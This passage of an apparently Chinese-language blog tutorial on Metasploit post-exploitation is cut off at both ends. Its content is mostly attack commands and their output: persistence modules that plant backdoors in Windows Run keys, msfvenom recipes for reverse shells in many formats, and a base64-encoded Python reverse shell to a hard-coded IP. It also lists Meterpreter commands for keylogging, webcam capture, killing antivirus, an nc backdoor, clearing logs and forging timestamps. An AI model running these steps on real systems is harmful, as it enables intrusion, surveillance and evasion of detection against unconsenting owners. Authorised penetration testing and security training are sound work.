2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>

启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure>

<h2 id="2-msf基本命令-5"><a href="#2-msf基本命令-5" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>

<h2 id="3-msfvenom生成payload-5"><a href="#3-msfvenom生成payload-5" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>

1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>

执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>

3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-5"><a href="#4-Meterpreter基本命令-5" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-5"><a href="#4-1-基本系统命令-5" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-5"><a href="#4-2-文件系统命令-5" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-5"><a href="#4-3-网络命令-5" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 